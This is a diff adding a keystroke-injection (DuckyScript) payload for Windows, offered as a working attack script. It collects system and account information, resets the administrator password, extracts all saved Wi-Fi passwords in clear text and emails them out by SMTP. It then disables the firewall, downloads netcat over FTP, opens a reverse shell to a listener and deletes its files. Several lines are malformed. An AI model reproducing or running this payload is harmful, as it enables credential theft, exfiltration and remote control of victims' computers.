@@ -1,0 +1,128 @@
+GUI r
+ENTER
+STRING CMD
+ENTER
+c ..
+ENTER
+c ..
+ENTER
+c ..
+ENTER
+cd
+ENTER
+mkdir ghosted
+ENTER
+cd ghosted
+ENTER
+cmd.exe
+ENTER
+ipconfig > recon.txt
+ENTER
+tasklist >> recon.txt
+ENTER
+whoami >> recon.txt
+ENTER
+hostname >> recon.txt
+ENTER
+driverquery -v >> recon.txt
+ENTER
+net user >> recon.txt
+ENTER
+net user administrator /random >> recon.txt
+ENTER
+netsh wlan show profile >> recon.txt
+ENTER
+REM --> Get all SSID
+STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
+ENTER
+REM --> Create a filter.bat to get all the profile names
+STRING echo setlocal enabledelayedexpansion^
+ENTER
+ENTER
+STRING for /f "tokens=5*" %%i in (a.txt) do (^
+ENTER
+ENTER
+STRING set val=%%i %%j^
+ENTER
+ENTER
+STRING if "!val:~-1!" == " " set val=!val:~0,-1!^ ENTER
+ENTER
+STRING echo !val!^>^>b.txt) > filter.bat ENTER
+REM --> Run filter.bat and save all profile names in b.txt
+STRING filter.bat
+DELAY 300
+ENTER
+REM --> Save all the good stuff in Log.txt and delete the other garbage files
+STRING (for /f "tokens=*" %i in (b.txt) do @echo SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt
+ENTER
+DELAY
+1000
+STRING del a.txt b.txt filter.bat
+ENTER REM --> Mail Log.txt
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail
+.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587) ENTER
+STRING $SMTPInfo.EnableSSL = $true ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<emailaddress@username.com>', 'PASSWORD>')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = '<emailaddress@username.com>' ENTER
+STRING $ReportEmail.To.Add('<emailaddress@username.com>')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi key grabber'
+ENTER
+STRING $ReportEmail.Body = (Get-Content Log.txt & Get-Content C:/ghosted/recon.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail) ENTER
+DELAY 500
+STRING netsh advfirewall firewall add rule name="FTP TCP Port 21" dir=in action=allow protocol=FTP localport=21
+STRING cd %USERPROFILE%
+ENTER
+DELAY 100
+STRING netsh firewall set opmode disable ENTER
+DELAY 2000
+STRING echo open [127.0.0.1] [21] > ftp.txt ENTER
+DELAY 100
+STRING echo [root]>> ftp.txt
+ENTER
+DELAY 100
+STRING echo [root]>> ftp.txt
+ENTER
+DELAY 100
+STRING echo bin >> ftp.txt
+ENTER
+DELAY 100
+STRING echo get nc.exe >> ftp.txt
+ENTER
+DELAY 100
+STRING echo bye >> ftp.txt
+ENTER
+DELAY 100
+STRING ftp -s:ftp.txt
+ENTER
+DELAY 2000
+GUI r
+DELAY 200
+STRING nc.exe [LISTENING IP] [LISTENER PORT] -e cmd.exe -d
+ENTER
+DELAY 2000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+STRING exit
+ENTER
+REM --> Delete Log.txt and exit
+STRING del Log.txt
+STRING del recon.txt
+STRING cd
+STRING c ..
+STRING del ghosted
+ENTER
+STRING del ftp.txt & exit
